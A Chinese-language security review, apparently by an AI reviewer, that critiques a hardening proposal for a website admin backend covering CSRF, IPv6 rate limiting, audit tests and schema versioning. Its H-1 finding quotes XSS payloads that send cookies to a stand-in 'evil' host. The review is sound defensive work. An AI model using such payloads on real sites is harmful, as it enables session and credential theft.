# 包⑩ 安全收口(T23)修法提案 — 证伪报告

- **证伪对象**:`2026-09-01-website-admin-t23-proposal.md`(Draft)
- **方法**:只读。逐文件回源 `worker/src/**`、`schema/src/**`、`admin/src/**`、`worker/test/**`、`worker/migrations/**`、`worker/runner.mjs`、`worker/README.md`、`PLAN/PRD/NexGrid_官网后台PRD_v1.0.md`;未起任何服务,未占用端口。
- **结论摘要**(先给结论,证据在后文各节):

| 项 | 判定 | 一句话 |
|---|---|---|
| §A CSRF(自定义头+Origin 兜底+GET 去副作用) | **需要修正** | 机制本身成立,但「现状」表漏了 5 个带副作用的 GET、写接口数错报(14 报成 13);中间件若不显式限定在非安全方法上会误伤只读路由;且与仓库自己写明的「Phase C 迁子域」计划正面冲突,proposal 未提及 |
| §B IPv6 限速键归一 | **可以照做**(需补实现细节) | 归一化本身即使在 CF 已归一时也是无害幂等操作,提案自己的「若已归一就该砍掉」推理不成立;但当前有 5 处各自读裸 IP、无共享出口,若只在 `createLimiter` 里做归一会漏掉 D1 版登录限速(`auth.ts`)——真正安全敏感的那个 |
| §C 审计覆盖测试 | **可以照做** | 核对 13 个 `writeAudit` 调用点与 `AUDIT_ACTIONS` 13 项一一对应,无孤儿枚举项;设计经得起推敲 |
| §D schema 版本漂移拒绝 | **不可行(按提案字面机制)**,需换成 PRD 原意的机制 | `config_versions`/`config_draft` 从未持久化过 `schemaVersion` 字段(zod schema 里根本没有这个字段,SQL 表也没有这一列)。按提案字面实现,首次上线当场把「加载/保存/发布」全部锁死(不止回滚),因为**现存的全部行**都没有这个字段。PRD CON16-E2 原文说的是「站构建脚本 schema 版本 ≠ worker 端」——比较的是两份**代码**的版本,不是比较每一份 config payload 的版本;提案把两件事混成了一件 |

以下逐节给证据。

---

## 现状表更正(提案「已回源核实」栏的几处误差)

提案开头的「现状」表本身也是待核实断言。回源结果:

1. **写接口不是 13 条,是 14 条。** 逐一枚举 `.post(`/`.put(` 结果:
   `auth.ts` setup/login/logout(3)+`config.ts` PUT /draft、POST /mint-id、POST /validate、POST /probe-downloads(4)+`geo.ts` PUT /、POST /bypass-token(2)+`publish.ts` POST /、POST /step、POST /cancel(3)+`index.ts` POST /api/admin/rollup(1)+`ingest.ts` POST /(1)= **14**。提案自己写的枚举列表其实就是这 14 条,只是数错了(标题写成「共 13 条」)。不影响后续设计,但既然提案强调「已回源核实,非推测」,这个数字应该先改对。

2. **带副作用的 GET 不止一条。** 提案说「只有一条:`GET /api/publish/status`」,但实际还有:
   - `configRoutes.get('/', …)`(`worker/src/config.ts:49-50`)开头就 `await ensureInit(c.env.DB)`;
   - `configRoutes.get('/versions', …)`(`worker/src/config.ts:194-195`)同样先 `ensureInit`;
   - `publishRoutes.use('*', async (c, next) => { await ensureInit(c.env.DB); await next(); })`(`worker/src/publish.ts:65-68`)挂在**整个** `/api/publish/*` 前缀上,意味着 `GET /api/publish/preflight`、`GET /api/publish/next`、`GET /api/publish/status` 三条 GET 全部会先跑一次 `ensureInit`;
   - `bypassExchange.get('/', …)`(`worker/src/geo.ts:167-189`)是 `GET /api/bypass?t=...`,命中后会 `KV.put(jti, …)`(一次性令牌标记)并 `setCookie(...)`——这也是一个有副作用的 GET,只是设计上本就打算公开、且需要一枚不可伪造的签名令牌才能触发,风险自成一档。

   `ensureInit` 的写入是「表为空才写」的一次性幂等操作(`SELECT id FROM config_versions LIMIT 1` 命中即直接返回),所以在跑起来的生产环境里,这个口子在第一次真实请求之后就自动关闭,重放价值趋近于零。但既然提案的「证伪五问 Q5」明确要问「还有没有别的带副作用的 GET」,这几处就应该先如实列出,再判断要不要一并处理,而不是遗漏在「现状」表之外。

3. **`origin|referer|csrf` 的 grep 结论方向是对的,但「仅命中注释」这句话不准。** 在 `worker/src` 里对 `cors|Access-Control|Origin|origin` 做大小写不敏感搜索是**零命中**(包括注释),`referer`/`csrf` 全仓搜索唯一的命中就是这份提案自己和上游 `2026-08-31-website-admin.plan.md`——即代码里连一处相关注释都没有,不是「命中了注释」。结论(worker 从不处理这三者)是对的,措辞需要改成「代码内 0 命中,仅本提案与上游计划文档提及」。

---

## §A CSRF 纵深(自定义头 + Origin 兜底 + GET 去副作用)

### Q1 会不会撞已有硬约束?

- 不撞 `Nexion-uniapp`/官网仓已有的哪条红线,这是新子系统,`worker/` 是本次改动唯一涉及面。
- **但会撞仓库自己写下的路线图**:`worker/src/index.ts:71` 注释「控制台 SPA(V1-dev 同域 /admin 路径;**Phase C 迁子域**)」、`worker/src/geo.ts:16-20` 注释「自锁保护(E1):/admin 与 /api 前缀恒不拦(V1-dev 同域路径制;**Phase C 子域后可收紧 /api 面**)」——这两处独立确认了同一件事:V1-dev 是控制台与 API 同源部署,Phase C 计划把控制台迁到独立子域。
  §A 整套防御的地基是「worker 不回放行任何 `Access-Control-*` 头 → 跨源预检必然失败 → 带自定义头的跨源请求发不出去」。这个不变量在**同源**部署下无成本(合法请求本就不跨源,不触发预检),但**一旦 Phase C 把控制台迁到子域,合法的控制台本身也变成跨源请求方**,届时要么继续用「零 CORS 头」策略(会连自己的控制台都挡在外面),要么必须给控制台的真实源头开一条 `Access-Control-Allow-Origin: <console 域名>` 白名单——而那正是「worker 回放行 CORS 头」,是本设计当前依赖的前提被自己未来的路线图推翻。
  提案全文没有提到这个冲突。这不是「值不值得做」的问题,是「现在这么写,Phase C 那一刻必须回来重做」的问题,应该在 T23 就把这个前提写清楚(比如:自定义头中间件从第一天起就接一个可配置、默认空的 `ALLOWED_CONSOLE_ORIGINS` 白名单常量,Phase C 只需要填值,不需要重新设计)。

### Q2 技术上做得到吗?

- 核心机制成立。跨源、带自定义头(non-simple request)必然触发预检 OPTIONS;只要 worker 从不返回 `Access-Control-Allow-*` 头,浏览器就会判预检失败并放弃发出真实请求——**这一点与预检 OPTIONS 最终落在哪个 handler(404 catch-all 还是 `requireAuth` 的 401)无关**,因为浏览器只看响应头,不看状态码。已确认:
  - `worker/src` 全仓搜索 `cors|Access-Control` 零命中,没有 `hono/cors` 中间件,`package.json` 依赖里也只有 `hono`+`zod`,没有引入任何 CORS 库。
  - `/api/*` 永远不会落到静态资产层:`app.all('/api/*', (c) => c.json({error:'not-found'},404))`(`index.ts:69`)排在所有具体 `/api/...` 路由**之后**、静态兜底 `app.all('*', …)`(`index.ts:82`)**之前**,任何未匹配到具体路由的 `/api/*` 请求(含预检 OPTIONS)在到达 `env.ASSETS.fetch()` 之前就已经被这个 JSON 404 拦下,所以「Cloudflare 静态资产层会不会自己回 CORS 头」这个问题对 `/api/*` 面完全不重要(即使会,也轮不到它)。
  - 没找到 `_headers` 文件,`wrangler.jsonc` 的 `assets` 块也没有 `headers` 配置项,静态资产层同样没有额外 CORS 配置。
- **需要修正的实现细节**:提案原文「一个中间件,挂在鉴权中间件之后、各写路由之前」没有说明按**方法**过滤。如果按 `app.use('/api/config/*', requireCsrfHeader)` 这种路径前缀挂载(和现有 `requireAuth` 的挂法一样),Hono 的 `.use()` 默认匹配该路径下的**全部方法**,会连 `GET /api/config`、`GET /api/dash` 这类只读轮询也一起要求带头——这些 GET 本不需要 CSRF 防护(GET 语义上不该有副作用,配合 §A-3「把副作用移出 GET」之后更是如此),把它们也纳入会不必要地放大波及面(参见下面 Q3 的实测)。**修法**:中间件内部先判断 `c.req.method`,只对 `POST/PUT/PATCH/DELETE` 生效,GET/HEAD/OPTIONS 直接放行。

### Q3 会不会让别的流程卡死?会不会让已有承诺不成立?

- 提案自己把这条列成「本提案最大的成本项」,列出五处波及面。实测下来,**波及面比提案描述的小很多**,且提案列错了两处:
  - `worker/test-static.mjs` 全文只发 3 类请求:`GET /api/health`、遍历 `dist-live` 下的静态路由(GET)、`GET /definitely-not-a-page-xyz`——没有一条命中鉴权路由或写接口,**这个文件不需要任何改动**。
  - `worker/README.md` 里唯一的 `curl` 示例是本地验证 cron 的 `curl "http://127.0.0.1:8787/__scheduled?cron=..."`,那是 wrangler dev 提供的调试端点,不经过 Hono 路由,与本提案无关,**这个文件也不需要改动**。
  - `runner.mjs` 的全部请求走单一出口函数 `api()`(`worker/runner.mjs:25-43`),加一行请求头是一处改动。
  - `admin/src/api.ts` 的全部请求走单一出口函数 `api()`(`admin/src/api.ts:12-17`),同样一处改动;而且它已经用 `credentials:'same-origin'`,与"同域"设计一致。
  - `worker/test/*.spec.ts`:`config.spec.ts`、`geo.spec.ts`、`publish.spec.ts` 三个文件都用同一个本地小写 `J(cookie)` 头部构造函数(各自文件内一行定义),改一行即可覆盖该文件全部写请求;`auth.spec.ts` 用模块级 `IP` 常量对象 + 少数几处内联头,改动也集中;`ingest.spec.ts` 打的是公开豁免的 `/api/e`,`dash.spec.ts` 是纯只读聚合,两者大概率不需要改。
  实际改动量约 6 个文件、每个文件 1-3 行,不是「全部写请求」那种铺开式改法。**结论**:成本比提案自评的更低,值得做;但 Q1 里 Phase C 子域冲突仍然是更大的隐患,权重应该更高。
- 对执行器(`runner.mjs`)、README 里记录的「一次完整发布约 15 分钟」承诺、发布锁 15 分钟 TTL 等既有约定没有冲突——`runner.mjs` 走的是同一个 `api()` 出口,补一个头不改变超时/重试语义。
- 对运营方出口网络无影响(§A 不涉及 IP)。

### Q4 自身有没有攻击面?

- **豁免名单能否被绕过**:提案把豁免限定在「`POST /api/e`」与「geo 直通兑换」两条,且要求「进代码常量,由审计覆盖测试断言其大小不增长」。当前找到的 6 处「无鉴权或带副作用的公开端点」里,`POST /api/e`、`GET /api/bypass` 确实该豁免(前者本就公开、无特权动作;后者已经要求一枚 HMAC 签名+TTL+一次性 token,新增一道自定义头校验不会提高安全性,只会让公开、按设计要跨站可达的链接机制复杂化)。但如果按 Q2 的修法把中间件限定在非安全方法上,`ensureInit` 触发的那几个 GET 根本不用进豁免名单——因为中间件本来就不检查 GET。
- **Origin 判据能否被伪造或缺席**:`Origin` 头由浏览器在协议层生成,页面 JS 无法覆盖(与 `fetch`/XHR 里手工设置无关的“禁止头”同一类),所以不能被网页脚本伪造;非浏览器客户端(`runner.mjs`、curl)常规不会带 `Origin`,这正是提案自己写的「存在才判」的原因,不构成设计缺陷。需要注意的是:比较时应同时较真 scheme(https/http)与 host,不要只比较 host,否则一个能借到同 host 不同 scheme 的边缘场景会被放过(Cloudflare 生产环境恒 https,这一条本身风险很低,但实现时顺手做对成本为零)。
- **自定义头会不会制造新的 DoS/易用性问题**:如果中间件按路径前缀而非方法挂载(重复 Q2 的担心),会把 `GET /api/dash` 这类监控/轮询端点也纳入強制头校验,外部监控脚本、健康检查工具会开始收到 403——这是自己给自己挖的坑,按 Q2 的修法即可避免。

### Q5 有没有漏掉同类情形?

- 见上文「现状表更正」第 2 条:漏了 4 个 `ensureInit` 触发的 GET(`GET /api/config`、`GET /api/config/versions`、`GET /api/publish/preflight`、`GET /api/publish/next`)和 1 个 `GET /api/bypass` 的令牌消费写入。前四个是同一个函数(`ensureInit`)造成的,建议**不是**给它们逐个搬家或加豁免,而是直接不让 `ensureInit` 挂在请求路径的中间件链上跑:它的语义是「首次安装引导」,更合适的位置是部署/迁移阶段跑一次,或者维持现状但在 T23 的挂账清单里明确写下「这是已知的、无害的一次性引导写,不计入 CSRF 修复范围」,而不是让「现状」表继续声称它不存在。
- 没有发现第 15 个写接口。以 14 条为准,和提案枚举的集合一致(只是计数写错)。

### §A 结论

**需要修正**:核心 CORS-预检 机制经得起验证,值得做,且实际改动成本比提案估计的更小。落地前必须补三件事——(1)中间件显式只挡 `POST/PUT/PATCH/DELETE`,不挡 GET;(2)「现状」表按上面补全 GET 副作用清单,`ensureInit` 那四个 GET 明确定性为「不需要处理」而不是假装不存在;(3)在设计里预留 Phase C 子域必然要用到的 CORS 白名单挂钩(哪怕现在是空实现),否则这套防御在真正上线那天会被自己的路线图推翻。

---

## §B 限速键 IPv6 归一到 /64

### Q1 会不会撞已有硬约束?

不撞。限速本身是纵深防御,不是任何状态机/审计不变量的一部分。

### Q2 技术上做得到吗?

做得到,但提案留的「⚠️ 待证伪方核」问题问错了方向。提案担心「若 Cloudflare 已经把 `CF-Connecting-IP` 归一到 /64,这条就是空操作,应该砍掉不做」——这个推理不成立:**把一个已经落在 /64 边界上的地址再截一次 /64 前缀是幂等操作,结果不变,没有任何下行风险**。也就是说,不管 Cloudflare 现在是否已经归一(据我所知——训练知识而非本次可验证的实测——`CF-Connecting-IP` 反映的是边缘实际连接到的字面地址,不做协议层聚合,和 IPv4 下 CGNAT 场景一样「不聚合、如实报告」;但这一点我没有生产流量可以现场验证),实现这条归一都不会更差,只会更安全或者不变。**结论:不需要等这个问题的答案就可以实现**,提案「若已归一就不该做」的暂停条件应该删掉。
真正需要注意的技术风险是 **IPv6 地址解析本身要处理正确**:必须能安全处理 `::` 压缩写法、IPv4-mapped 地址(`::ffff:1.2.3.4`)、以及最重要的——当前代码里 `cf-connecting-ip` 缺失时的兜底字面量字符串 `'unknown'`(见 `auth.ts:60`、`index.ts:85`、`geo.ts:146,168`、`ingest.ts:30` 全部用 `?? 'unknown'`)。归一函数必须对非 IP 输入(如字面量 `"unknown"`、IPv4 地址)直接透传而不是抛异常,否则一次头缺失的请求(本地 curl 调试、健康检查工具没有过 Cloudflare 边缘)会让限速调用本身抛错,把一个「放行」变成「500」。

### Q3 会不会让别的流程卡死?会不会误伤运营方的出口网络?

- 不影响执行器、测试、README 承诺。
- 会**误伤面**確有,提案已承认「/64 通常对应单个家庭/站点」,但有一处提案没展开、值得单独指出:**登录限速(`auth.ts` 的 `registerAttempt`)如果也套用 /64 归一,会把「单一管理员账号」的登录失败额度,从「按攻击者 IP 分摊」变成「按攻击者所在 /64 前缀分摊」**。这个系统是单管理员(`auth_account WHERE id = 1`,全库唯一一行),锁定影响的就是这一个账号。如果管理员本人也处在某个共享性较强的 IPv6 分配场景下(部分移动网络运营商的 IPv6 前缀委派粒度比家庭宽带更粗),同一 /64 里任何第三方(哪怕只是恶意，不需要真的共享网络,只要能从落在该 /64 内的地址发起请求即可,IPv6 主机通常可以在自己被分配的前缀内自选接口标识符)刷 5 次错误密码,就会把管理员自己锁在门外 15 分钟——这是**唯一管理员的可用性**问题,比公开采集/兜底限速被误伤的后果重得多。建议:是否对登录限速这一路也套用 /64 归一,应该单独决策并写进提案,而不是笼统一句「限速键归一」带过。

### Q4 自身有没有攻击面?

- 归一化让攻击者从「N 个 IPv6 地址各打 5 次」缩小到「N/64 个前缀各打 5 次」,收紧的是攻击者的攻击面,不是新开一个面。
- 唯一新增的风险就是 Q3 里说的「反向 DoS」:归一让原本相互独立的同前缀用户共享同一份配额,如果这份配额恰好保护的是全系统唯一一个登录入口,攻击者只需要让自己的地址落在管理员的 /64 内就能反向拒绝管理员登录。这个前提(攻击者需要知道或蹭到管理员的 /64)门槛不算低,但值得在提案里写明是一个「已知且接受」的权衡,而不是空白。

### Q5 有没有漏掉同类情形?

**漏了。** 当前代码里裸读 `cf-connecting-ip` 的地方一共 **5 处**,各自独立、没有共享出口:

| 文件:行 | 用途 | 走的限速实现 |
|---|---|---|
| `worker/src/auth.ts:60`(`clientIp`) | 登录/setup 限速键 | D1 表 `login_throttle`(**不经过** `ratelimit.ts` 的 `createLimiter`) |
| `worker/src/ingest.ts:30` | 埋点采集限速键 | `createLimiter`(内存) |
| `worker/src/geo.ts:146` | 拦截统计写入节流键 | `createLimiter`(内存) |
| `worker/src/geo.ts:168` | 直通兑换限速键 | `createLimiter`(内存) |
| `worker/src/index.ts:85` | 404 计数节流键 | `createLimiter`(内存) |

提案的「现状」表把这一条的出处写成 `src/ratelimit.ts`,但 `ratelimit.ts` 本身完全不知道 IP 的存在(它是一个通用 key→计数器工厂,`hit(key)` 的 `key` 是调用方传进来的任意字符串)。**如果实现时想当然地在 `createLimiter` 内部做归一,会漏掉 `auth.ts` 那一路**——恰好是唯一走持久化存储、唯一保护单点账号、语义上最需要归一的那一路。正确做法是新增一个共享的 `clientIpKey(c)` 函数(可以放在 `ratelimit.ts` 里,和限速器放在一起管理,但独立于 `createLimiter`),让上述 5 个文件全部改成调用它,不再各自内联 `c.req.header('cf-connecting-ip') ?? 'unknown'`。这也顺手解决了「单一真源没有守住全部消费面」的问题——否则以后每加一个新的按 IP 限速的地方,都要有人记得手动套归一函数,漏一次就是一次悄悄失效。

### §B 结论

**可以照做**,且不需要等待「Cloudflare 是否已归一」这个悬而未决的问题(幂等,做了不会更差)。落地前必须:(1)把 5 个裸读 `cf-connecting-ip` 的地方收口成一个共享函数;(2)IPv6 解析要处理 `'unknown'`/IPv4/压缩写法的兜底,不能崩;(3)明确对登录限速套用归一的可用性权衡,单独写一句决策依据。

---

## §C 审计覆盖测试

### Q1-Q2 硬约束/技术可行性

不撞任何约束,技术上直接可行。`writeAudit` 的入参类型是 `AuditEntry['action']: AuditAction`(`worker/src/audit.ts:20-23`),这个联合类型就是从 `AUDIT_ACTIONS` 派生的,**tsc 已经保证了"实际调用点的 action ⊆ 枚举"这个方向**;逐一核对全仓 `writeAudit(` 调用点:
`auth.ts`(auth.setup、login.success、login.fail×2、auth.logout)、`config.ts`(config.save)、`geo.ts`(geo.update、bypass.issue)、`publish.ts`(config.publish/config.rollback 同一行三元、config.publish.failed、config.publish.live、config.publish.cancel)、`index.ts`(admin.rollup)——恰好 13 个动作,和 `AUDIT_ACTIONS` 数组的 13 项一一对应,**没有孤儿枚举项**。提案要补的正是 tsc 管不到的反方向(枚举里有、但没有真实请求路径能触发到),这个测试设计是对的。

### Q3-Q4 流程/攻击面

不影响任何既有流程;这是新增的纯测试代码,没有攻击面。

### Q5 有没有漏掉同类情形

设计上没有遗漏,但有一处实现细节要提前想到:**`bypass.issue` 这个动作依赖 `bypassSecret(env)` 返回非空**(`geo.ts:85-90`,C1 fail-closed 逻辑——`BYPASS_SECRET` 未配置,或在非 dev/preview 环境仍等于仓库内默认值 `dev-bypass-secret`,都会返回 `null`,`POST /api/geo/bypass-token` 直接 503,不会走到 `writeAudit`)。覆盖测试要真正触发这个动作,必须确保测试环境的 `env.BYPASS_SECRET`/`env.ENVIRONMENT` 组合能通过这道闸,否则这一条会长期红,而且红的原因和「审计缺失」无关,容易被误判成测试设计问题。这是实现时的一个坑,不是设计缺陷。

### §C 结论

**可以照做。**

---

## §D CON16-AC4 配置结构版本漂移拒绝

### 提案自己标记的疑点:成立,而且比提案预判的更严重

提案问的是「回滚到旧版本时,旧 payload 的 schemaVersion 必然是旧值,会不会把回滚路径锁死」。回源结果:这个疑点**成立**,但根子比"回滚受影响"更深——**受影响的不止回滚,是全部**。

证据链:

1. `SiteConfigSchema`(`schema/src/site-config.ts:38-71`)——也就是 `config_versions.payload` / `config_draft.payload` 落库前后要过的那个 zod 结构——**从头到尾没有 `schemaVersion` 这个字段**。
2. `worker/migrations/0001_init.sql:5-21` 里 `config_versions`/`config_draft` 两张表,`payload` 就是一个 `TEXT` 列存整份 JSON,**没有额外的 `schema_version` 列**。
3. `SCHEMA_VERSION`(`schema/src/site-config.ts:82`,值为 `1`)在全仓唯一的落地点是 `materializeSiteJson()`(`schema/src/materialize.ts:38-40`)——它是**物化时现取的常量**,写进的是**输出产物** `src/config/site.json`(可在 `src/config/site.json:2` 看到 `"schemaVersion": 1`),不是从传进来的 `SiteConfig` 对象里读出来的字段。也就是说,不管拿哪个历史版本的 `SiteConfig` 去物化,写进 `site.json` 的永远是**当前运行代码**的 `SCHEMA_VERSION`,和被物化的那份配置内容本身的"年龄"无关。

**结论**:今天这套系统里,压根不存在"某一份 config payload 自带的 schemaVersion"这个东西。如果按提案字面「载入/物化配置时,`schemaVersion` ≠ 当前 `SCHEMA_VERSION` → 拒绝」去实现,唯一现实的落地方式是给 `SiteConfigSchema` 新增一个必填字段。而 `SiteConfigSchema.safeParse`/`.parse()` 是 zod object,新增必填字段后,**现存的每一行 `config_versions`、以及当前的 `config_draft`,因为都是在这个字段存在之前写入的,统统会因为缺这个字段而校验失败**——不止回滚目标版本,连**当前正在用的 live 版本、当前草稿**在下一次调用 `configRoutes.get('/')`→`getLive`→(如果后续代码开始对它做 safeParse)或 `publishRoutes.post('/')`→`SiteConfigSchema.safeParse(JSON.parse(payload))`(`publish.ts:107`)、`publishRoutes.get('/preflight')`→`SiteConfigSchema.parse(...)`(`publish.ts:74`,注意这里用的是会抛异常的 `.parse` 不是 `.safeParse`,没有 try/catch 包裹)时都会失败——**发布前置校验会直接抛未捕获异常(500),不是提案想要的"拒绝并说明"**。这比提案自己担心的"回滚路径被锁死"要严重一个数量级:是"这个功能一旦上线,当天所有编辑/发布操作就地失效",除非同时配一次数据回填迁移(给全部历史行的 JSON blob 补上 `schemaVersion` 字段)——而提案完全没提到需要这样一次迁移。

### 更根本的问题:提案重新定义了 PRD 原本更窄、更安全的机制

PRD 原文(`PLAN/PRD/NexGrid_官网后台PRD_v1.0.md:763`,[FEAT-CON16] E2):

> 异常2 E2(schema 版本漂移):Given **站构建脚本 schema 版本 ≠ worker 端**,Then 物化拒绝执行并报「站代码与控制台版本不匹配,先部署站代码」(防契约镜像漂移)。

PRD 比的是**两份代码**各自携带的 `SCHEMA_VERSION` 常量——「站构建脚本」(即 V1-dev 的 `runner.mjs` + 它 import 的 `schema/src/materialize.ts`,或 Phase C 的 CI 执行器)与「worker 端」(线上部署的 worker 所携带的 `SiteConfigSchema`/`SCHEMA_VERSION`)是否一致,防的是"物化脚本和 worker 部署到了不同代码版本"这种**部署偏斜**(比如 CI 缓存了旧 checkout、或者 worker 部署失败但物化流水线继续跑)。这和"某一条 config payload 记录本身是哪个 schema 版本"完全是两件事:前者比较的是**两份正在运行的代码**,后者试图比较**存量数据**——提案把 PRD 里"代码对代码"的检查,重新解释成了"数据对代码"的检查,这个重新解释本身没有依据,还带出了上面那个自锁死的实现陷阱。

`T9`(物化脚本包)当时的回源三问已经预见到这个边界:"AC4 的 schema 版本漂移拒绝面实现于**物化端点接线**(T22 执行器)时联测,本包 SCHEMA_VERSION 锚已立"——落点在物化步骤(执行器),不在 `worker/src/config.ts` 的任何"加载"函数里。提案标题写「载入/物化配置时」,把"载入"也拉了进来,这一步是提案自己的扩权,PRD 原文只提"物化"。

### 建议的修法(按 PRD 原意重新设计,成本远低于提案原案)

- **不新增任何 payload 字段,不做任何历史数据迁移。**
- 给 `GET /api/health`(`index.ts:21-23`,本来就是公开、无鉴权端点)加一个字段,直接回报 worker 当前的 `SCHEMA_VERSION`(反正这个整数已经明文出现在**每个访客都能下载到**的公开产物 `src/config/site.json` 里,加到 `/api/health` 不构成任何新增信息泄露)。
- 在 `runner.mjs` 的 `runJob()` 物化步(`worker/runner.mjs:61-77`)开头,先 `fetch` 一次 `${API}/api/health`,把返回的 `schemaVersion` 与自己 `import` 的 `SCHEMA_VERSION` 比较,不一致就 `report(versionId, 'materialize', 'failed', { detail: '站代码与控制台版本不匹配,先部署站代码' })` 并直接返回,不执行 `materializeI18n`/`materializeSiteJson`。
- 这个设计天然不影响回滚:回滚只是把 `config_versions` 里某一行的 `payload` 字节拿来当新发布的输入内容(`publish.ts:96-105`,`payload = src.payload`),物化时比较的仍然是"当前 runner 代码版本 vs 当前 worker 代码版本",与被回滚内容的新旧无关。也不需要任何一次性数据迁移或对存量行的兼容处理。

### §D 结论

**不可行(按提案字面「给 payload 加 schemaVersion 字段并比对」这个具体机制)**——会在没有配套数据迁移的情况下,于上线当天让全部配置加载/保存/发布路径失效,且发布前置校验路径会直接抛出未捕获异常而不是提案期望的"拒绝并说明"。**应改为 PRD 原文描述的机制**:比较「物化脚本(runner/CI)自带的 SCHEMA_VERSION」与「worker 端当前部署的 SCHEMA_VERSION」这两份**代码**的版本号,检查点落在物化步骤开始前,不涉及任何存量数据、不影响回滚。

---

## 其它发现(security-reviewer 视角,按严重度分列)

### HIGH

**H-1:Legal markdown 服务端 sanitizer 是正则黑名单,存在至少两条已知绕过路径**
- 位置:`worker/src/config.ts:98-101`
  ```
  const after = before
    .replace(/<script[\s\S]*?<\/script\s*>/gi, '')
    .replace(/<iframe[\s\S]*?(?:<\/iframe\s*>|\/>)/gi, '')
    .replace(/\son\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '');
  ```
- 现象/可利用路径:
  1. **未闭合标签绕过**:`<script[\s\S]*?<\/script\s*>` 要求文本里存在一个字面 `</script>`(允许其后有空白但不允许其它字符)才会匹配。提交 `<script>fetch('https://evil/steal?c='+document.cookie)</script->`(闭合标签里混入一个 `-`,不满足 `\s*>`)或干脆提交没有任何闭合标签的 `<script>...`,整段都不会被替换,原样落库。HTML5 解析规则下,一个没有匹配到 `</script>` 的 `<script>` 标签会把其后**直到文档末尾**的内容都当作脚本内容解析执行。
  2. **`javascript:` 协议绕过**:三条正则分别只处理 `<script>`、`<iframe>`、`on\w+=` 事件属性,完全没有检查 `href`/`src` 等属性的协议头。`<a href="javascript:fetch('https://evil/steal?c='+document.cookie)">点击</a>` 或等价的 markdown 链接语法能完整存活,现代主流浏览器目前仍然会在用户点击这类 `<a href="javascript:...">` 时执行其中的脚本。
  - 已有测试(`worker/test/config.spec.ts:187-195`)只覆盖了"标签完整闭合"的场景(`<script>alert(1)</script>`、`<iframe src="x"></iframe>`、`onclick="evil()"`),没有覆盖上述两条绕过——测试通过不代表 sanitizer 安全。
- 建议修法:不要用正则黑名单处理 HTML/Markdown。管理端自己的预览器(`admin/src/pages/legal.tsx:11-47` 的 `mdLite()`)已经是一个白名单式实现——只认 `**粗体**`、`[text](https://... 或 /...)`、`#`标题、`-`列表这几种结构,其余原文一律当纯文本节点(不解析成 HTML,天然不可能执行),且链接的 URL 正则本身就只放行 `https://` 或 `/` 开头,不给 `javascript:` 任何机会。服务端应该复用同一套"白名单解析、非白名单一律转义"的策略(可以是同一份解析逻辑挪到 `schema/` 包共享),而不是"先假设是危险就删除已知模式,其余默认安全"的黑名单思路。

**H-2(与 H-1 关联,严重度按"一旦接线"评估):Legal markdown 编辑器目前没有任何输出通道能接到官网页面上,CON11-A1 的验收承诺不成立**
- 位置:`schema/src/materialize.ts:38-52`(`materializeSiteJson` 输出对象里没有 `legal` 字段)、`schema/src/manifest.ts`(全文搜索 `legal` 零命中)、`src/components/legal/LegalTerms.astro`(以及同目录 `LegalPrivacy.astro`/`LegalAppPrivacy.astro`,结构相同)——三份 Legal 页面组件是完全硬编码的英文静态正文,没有任何地方读取 `config`/`site.json`/i18n 里的 `legal.*.md` 字段。
- 现象:PRD `[FEAT-CON11]` A1(`PLAN/PRD/NexGrid_官网后台PRD_v1.0.md:547`)明确写「Given 法务供稿到位,When 粘贴 privacy 的 en 正文、预览、发布,**Then 站上 /legal/privacy 渲染新文**」——这是阳光路径的核心验收标准,不是边角场景。但物化器根本不产出 `legal` 字段,官网 Legal 三页也不消费任何配置数据。也就是说:管理员在控制台编辑、保存、甚至"发布"了 Legal 正文之后,官网上的 `/legal/*` 页面**内容完全不会变**——这条功能链在"落到网页上"这最后一步是断的。
- 与 T14(该功能所在包)在 `2026-08-31-website-admin.plan.md:112-114` 里被标记为 `[x]` 已完成、tester 报告写"公告红条…Legal 白名单预览+服务端剥离真实计数"全部通过,形成矛盾——tester 验的是"编辑器功能正确"(校验/sanitize/预览/审计),没有验"发布后站上真的变了"这一条 CON11-A1 的字面要求(对照 T13/T14 同一份验收记录里,产品卡的 JSON-LD 那条明确写了"E2E 查产物"做了实测,Legal 这条没有类似表述)。
- 建议修法:这不是本次 T23 范围内能顺手带上的小修复(需要设计物化格式+ Astro 侧渲染改造+ sanitizer 换成白名单解析,即 H-1),但**必须先如实向主人说明这个缺口**,因为它意味着一个已经打勾"完成"的包,其验收标准里明确写出的阳光路径实际没有走通。建议:(a) 在 T23 或紧随其后建一个新任务补齐"Legal 物化 + 站侧渲染"这条链路,顺带把 H-1 的 sanitizer 换成白名单实现;(b) 在此之前,如果 CON11 的编辑器要继续开放使用,应该在管理界面给出明确提示"当前保存/发布不会改变线上 Legal 页面内容",避免主人以为已生效。

### MEDIUM

**M-1:§D 提案机制若直接实现,会在无迁移的情况下瘫痪现网数据面**
- 已在上文 §D 详述,这里单独列出是因为它不只是"提案需要修正"的设计问题,更是一条**如果被误按字面执行会立刻造成生产事故**的具体路径。位置同上:`schema/src/site-config.ts:38-71`、`worker/migrations/0001_init.sql:5-21`、`worker/src/publish.ts:74,107`。

**M-2:全局没有 `app.onError()` 兜底,未捕获异常可能把 Hono 默认错误文案(含内部 `Error.message`)直接吐给客户端**
- 位置:`worker/src/index.ts` 全文搜索 `onError` 零命中。
- 现象:任何路由 handler 里没有被 try/catch 包住的异常(比如上面 H-2/M-1 场景下 `SiteConfigSchema.parse()` 抛出的 `ZodError`),会走 Hono 框架默认的错误处理路径返回给客户端,可能带出比"通用错误提示"更多的内部信息(字段名、校验规则细节),不算严重信息泄露,但和"错误处理不应该暴露内部实现"这条通用安全基线不符。
- 建议修法:在 `app.use('*', geoMiddleware)` 之后加一个顶层 `app.onError((err, c) => { console.error(err); return c.json({ error: 'internal-error' }, 500); })`,统一兜底,内部细节走日志不进响应体。

**M-3:控制台没有设置任何安全响应头(CSP / X-Frame-Options / X-Content-Type-Options)**
- 位置:全仓搜索,`worker/src` 没有任何地方设置这些头;`wrangler.jsonc` 的 `assets` 块没有 `headers` 配置;仓内没有 `_headers` 文件。
- 现象:管理控制台(`/admin/*`)是唯一管理员执行发布/回滚/屏蔽规则变更/密钥签发等高敏操作的界面,但响应里没有 `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` ——理论上可以被恶意页面用 `<iframe>` 嵌入做点击劫持(诱导管理员在不知情的情况下点到被覆盖的按钮)。没有 CSP 也意味着如果 H-1/H-2 那条链路以后被接通,CSP 这道本可以兜底拦截内联脚本执行的防线现在是空的。
